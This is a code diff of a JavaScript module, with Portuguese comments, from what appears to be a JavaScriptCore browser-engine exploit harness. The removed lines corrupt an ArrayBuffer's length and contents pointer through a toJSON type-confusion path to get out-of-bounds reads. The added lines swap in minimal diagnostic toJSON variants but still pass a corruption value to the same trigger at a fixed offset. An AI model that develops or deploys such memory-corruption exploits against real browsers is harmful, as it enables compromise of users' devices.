@@ -1,87 +1,131 @@
 // js/script3/runAllAdvancedTestsS3.mjs
 import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
 import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
-// Importa a função de teste principal e a toJSON de sondagem
-import { executeFocusedTestForTypeError, toJSON_AttemptWriteToThis } from './testJsonTypeConfusionUAFSpeculative.mjs'; 
-import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs'; 
-import { AdvancedInt64, toHex } from '../utils.mjs';     
+// executeFocusedTestForTypeError é importado, mas current_toJSON_call_count_for_TypeError_test NÃO é mais.
+import { executeFocusedTestForTypeError } from './testJsonTypeConfusionUAFSpeculative.mjs';
+import { OOB_CONFIG } from '../config.mjs'; 
+import { toHex } from '../utils.mjs';     
 
-async function runTargetedOOBABMetadataExploitation() {
-    const FNAME_RUNNER = "runTargetedOOBABMetadataExploitation";
-    logS3(`==== INICIANDO Testes de Exploração de Metadados de oob_array_buffer_real via toJSON ====`, 'test', FNAME_RUNNER);
+// Contador global AGORA LOCALIZADO NESTE MÓDULO
+let current_toJSON_call_count_for_TypeError_test = 0;
 
-    const size_offset = parseInt(JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, 16);
-    const contents_ptr_offset = parseInt(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET, 16);
+// --- Funções toJSON para teste de decomposição ultra-minimalista e diagnóstico ---
 
-    if (isNaN(size_offset) || isNaN(contents_ptr_offset)) {
-        logS3("ERRO: Offsets de ArrayBuffer em config.mjs não são válidos!", "error", FNAME_RUNNER);
-        return;
+// Variante V0 (Controle - Passa): Absolutamente Mínima
+function toJSON_Decomp_V0_ReturnEmptyObject() {
+    // Nenhuma operação interna que possa causar TypeError.
+    // current_toJSON_call_count_for_TypeError_test não é incrementado aqui.
+    return { payloadV0: "V0_empty_object_returned" }; 
+}
+
+// Variante X.1 (Novo Teste): Tenta apenas LER uma variável global
+function toJSON_ReadGlobalOnly() {
+    // current_toJSON_call_count_for_TypeError_test não é incrementado aqui para isolar a leitura.
+    let read_value = "N/A";
+    let error_reading = null;
+    try {
+        // Tenta ler uma config global. Certifique-se que OOB_CONFIG está disponível no escopo global
+        // ou passe-a de alguma forma se necessário, ou use outra global como 'Math'.
+        // Para este teste, OOB_CONFIG é importada neste módulo, então está acessível.
+        read_value = OOB_CONFIG.ALLOCATION_SIZE; 
+    } catch (e) {
+        error_reading = e.name + ": " + e.message;
     }
+    return { payloadX1: "X1_read_global", value: read_value, error: error_reading };
+}
 
-    // Cenário A: Tentar Corromper o TAMANHO do oob_array_buffer_real e sondá-lo
-    logS3(`\n--- Cenário A: Corromper Tamanho de oob_array_buffer_real @${toHex(size_offset)} para 0x7FFFFFFF ---`, 'subtest', FNAME_RUNNER);
-    let resultA = await executeFocusedTestForTypeError(
-        "Exploit_CorruptOOBABSize",
-        toJSON_AttemptWriteToThis,      // A função toJSON que tentará operar em 'this'
-        0x7FFFFFFF,                     // Valor para corromper o tamanho
-        size_offset,                    // Offset do campo de tamanho no oob_array_buffer_real
-        4                               // Bytes para escrever (tamanho é geralmente 4 bytes)
-        // O buffer a ser stringificado será o oob_array_buffer_real interno da função chamada
-    );
+// Variante X.2 (Novo Teste): Tenta apenas CHAMAR uma função global pura
+function toJSON_CallGlobalMath() {
+    // current_toJSON_call_count_for_TypeError_test não é incrementado aqui.
+    let math_result = "N/A";
+    let error_calling = null;
+    try {
+        math_result = Math.abs(-5); // Chama uma função global "segura"
+    } catch (e) {
+        error_calling = e.name + ": " + e.message;
+    }
+    return { payloadX2: "X2_call_global_math", result: math_result, error: error_calling };
+}
 
-    logS3(`   Resultado Cenário A (Tamanho): ${resultA.stringifyResult ? JSON.stringify(resultA.stringifyResult) : "N/A"}`, "info", FNAME_RUNNER);
-    if (resultA.stringifyResult?.this_byteLength_prop === 0x7FFFFFFF) {
-        logS3(`   !!!! SUCESSO POTENCIAL CENÁRIO A !!!! oob_array_buffer_real.byteLength parece ter sido inflado para 0x7FFFFFFF!`, "critical", FNAME_RUNNER);
-        if (resultA.stringifyResult?.oob_read_attempt_val && !String(resultA.stringifyResult.oob_read_attempt_val).startsWith("Error") && !String(resultA.stringifyResult.oob_read_attempt_val).startsWith("Too small")) {
-             logS3(`   !!!! LEITURA OOB EM oob_array_buffer_real BEM-SUCEDIDA !!!! Valor: ${resultA.stringifyResult.oob_read_attempt_val}`, "critical", FNAME_RUNNER);
+// Variante V2 (Controle - Falha): Apenas incrementa o contador global.
+function toJSON_Decomp_V2_GlobalCounterOnly() {
+    current_toJSON_call_count_for_TypeError_test++; // << PONTO DE FALHA ANTERIOR
+    return { payloadV2: "V2_global_counter_incremented", call_count_inside_toJSON: current_toJSON_call_count_for_TypeError_test };
+}
+
+
+async function runUltraMinimalDiagnosticTests() {
+    const FNAME_RUNNER = "runUltraMinimalDiagnosticTests";
+    logS3(`==== INICIANDO Testes de Diagnóstico Ultra-Minimalista para TypeError ====`, 'test', FNAME_RUNNER);
+
+    const tests = [
+        { description: "Decomp_V0_ReturnEmptyObject (Controle PASSA)", func: toJSON_Decomp_V0_ReturnEmptyObject },
+        { description: "Diagnostic_X1_ReadGlobalOnly", func: toJSON_ReadGlobalOnly },
+        { description: "Diagnostic_X2_CallGlobalMath", func: toJSON_CallGlobalMath },
+        { description: "Decomp_V2_GlobalCounterOnly (Controle FALHA)", func: toJSON_Decomp_V2_GlobalCounterOnly },
+    ];
+
+    const valueForCorruption = 0xFFFFFFFF;
+    const criticalOffset = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
+
+    for (const test of tests) {
+        logS3(`\n--- Testando Variante toJSON: ${test.description} ---`, 'subtest', FNAME_RUNNER);
+        document.title = `Iniciando SubTeste: ${test.description}`; 
+        
+        current_toJSON_call_count_for_TypeError_test = 0; // Resetar contador ANTES de cada teste
+        
+        const result = await executeFocusedTestForTypeError(
+            test.description,
+            test.func,
+            valueForCorruption,
+            criticalOffset
+        );
+        
+        // Logar o contador deste módulo após a execução do teste
+        const calls_this_run = current_toJSON_call_count_for_TypeError_test;
+
+        if (result.errorOccurred) {
+            logS3(`   RESULTADO ${test.description}: ERRO JS CAPTURADO: ${result.errorOccurred.name} - ${result.errorOccurred.message}. Chamadas toJSON (este módulo): ${calls_this_run}`, "error", FNAME_RUNNER);
+        } else if (result.potentiallyCrashed) {
+            logS3(`   RESULTADO ${test.description}: CONGELAMENTO POTENCIAL. Chamadas toJSON (este módulo): ${calls_this_run}`, "error", FNAME_RUNNER);
+        } else {
+            logS3(`   RESULTADO ${test.description}: Completou sem erro explícito no stringify. Chamadas toJSON (este módulo): ${calls_this_run}`, "good", FNAME_RUNNER);
+            logS3(`      Resultado da toJSON (stringifyResult): ${result.stringifyResult ? JSON.stringify(result.stringifyResult) : 'N/A'}`, "info", FNAME_RUNNER);
+        }
+        logS3(`   Título da página ao final de ${test.description}: ${document.title}`, "info");
+        await PAUSE_S3(MEDIUM_PAUSE_S3);
+
+        if (document.title.startsWith("CONGELOU?")) {
+            logS3("Congelamento detectado, interrompendo próximos testes de diagnóstico.", "error", FNAME_RUNNER);
+            break;
         }
     }
-    await PAUSE_S3(MEDIUM_PAUSE_S3);
 
-
-    // Cenário B: Tentar Corromper o PONTEIRO de Conteúdo do oob_array_buffer_real e sondá-lo
-    logS3(`\n--- Cenário B: Corromper Ponteiro de Conteúdo de oob_array_buffer_real @${toHex(contents_ptr_offset)} para 0x4242424242424242 ---`, 'subtest', FNAME_RUNNER);
-    const dummy_ptr_val = new AdvancedInt64("0x4242424242424242");
-    let resultB = await executeFocusedTestForTypeError(
-        "Exploit_CorruptOOBABContentsPtr",
-        toJSON_AttemptWriteToThis,
-        dummy_ptr_val,                  // Valor para corromper o ponteiro (AdvancedInt64)
-        contents_ptr_offset,            // Offset do campo de ponteiro
-        8                               // Bytes para escrever (ponteiro é 8 bytes)
-        // O buffer a ser stringificado será o oob_array_buffer_real interno da função chamada
-    );
-    logS3(`   Resultado Cenário B (Ponteiro): ${resultB.stringifyResult ? JSON.stringify(resultB.stringifyResult) : "N/A"}`, "info", FNAME_RUNNER);
-    if (resultB.stringifyResult?.error_in_toJSON && resultB.stringifyResult.error_in_toJSON.includes("DataView Error")) {
-         logS3(`   !!!! SUCESSO POTENCIAL CENÁRIO B !!!! Erro de DataView DENTRO da toJSON após corrupção do ponteiro, como esperado!`, "critical", FNAME_RUNNER);
-    } else if (resultB.errorOccurred && resultB.errorOccurred.message.includes("DataView")) {
-        logS3(`   !!!! SUCESSO POTENCIAL CENÁRIO B !!!! Erro de DataView FORA da toJSON (no stringify) após corrupção do ponteiro!`, "critical", FNAME_RUNNER);
-    }
-
-    logS3(`==== Testes de Exploração de Metadados de oob_array_buffer_real CONCLUÍDOS ====`, 'test', FNAME_RUNNER);
+    logS3(`==== Testes de Diagnóstico Ultra-Minimalista para TypeError CONCLUÍDOS ====`, 'test', FNAME_RUNNER);
 }
 
 export async function runAllAdvancedTestsS3() {
-    const FNAME = 'runAllAdvancedTestsS3_TargetedOOBABMetaExploit';
+    const FNAME = 'runAllAdvancedTestsS3_UltraMinimalDiagnostics';
     const runBtn = getRunBtnAdvancedS3();
     const outputDiv = getOutputAdvancedS3();
 
     if (runBtn) runBtn.disabled = true;
     if (outputDiv) outputDiv.innerHTML = '';
 
-    logS3(`==== INICIANDO Script 3: Exploração de Metadados de oob_array_buffer_real via toJSON ====`,'test', FNAME);
-    document.title = "Iniciando Script 3 - Exploit Meta OOB AB";
+    logS3(`==== INICIANDO Script 3: Diagnóstico Ultra-Minimalista do Gatilho do TypeError ====`,'test', FNAME);
+    document.title = "Iniciando Script 3 - Diagnóstico UltraMinimal";
     
-    await runTargetedOOBABMetadataExploitation();
+    await runUltraMinimalDiagnosticTests();
     
-    logS3(`\n==== Script 3 CONCLUÍDO (Exploração de Metadados de oob_array_buffer_real) ====`,'test', FNAME);
+    logS3(`\n==== Script 3 CONCLUÍDO (Diagnóstico Ultra-Minimalista do TypeError) ====`,'test', FNAME);
     if (runBtn) runBtn.disabled = false;
     
-    if (document.title.startsWith("Iniciando") || document.title.includes("ERRO") || document.title.includes("CONGELOU?")) {
+    if (document.title.startsWith("Iniciando") || document.title.startsWith("CONGELOU?")) {
         // Manter
-    } else if (document.title.includes("SUCCESS") || document.title.includes("SUCESSO POTENCIAL")) {
-        // Manter
+    } else if (document.title.includes("ERRO")) {
+        // Manter título de erro
     }
     else {
-        document.title = "Script 3 Concluído - Exploit Meta OOB AB";
+        document.title = "Script 3 Concluído - Diagnóstico UltraMinimal";
     }
 }
